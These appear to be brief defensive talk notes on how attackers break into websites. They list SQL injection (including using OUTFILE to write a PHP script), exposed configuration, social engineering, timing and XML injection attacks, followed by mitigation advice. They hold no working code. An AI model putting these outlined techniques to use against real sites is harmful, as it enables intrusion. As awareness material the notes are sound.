   =====

- Hackers deal with quirks
 - Don't look at it the way we would

- Most hackers hate writing code
 - They'll use repeatable, common vectors using automated tools to find their way in
 - This means that _any_ site can be at risk - with automation, there isn't a cost vs. reward tradeoff

- Common Vectors:

- SQL Injection
 - SQL Injection combined with LOAD INFILE
 - Load DATA OUTFILE - write a PHP script!
 - User data is the problem - never trust it

- Exposed Configuration
 - Magmi

- Gadgets
 - Social Engineering

- Time based attack

- XML Injection

- Solutions
 - Don't trust user input - could alos be part of the URL
 - Third party code/Third party APIs - what damage could they do if they were compromised?
 - Change monitoring
 - Audit regularly.
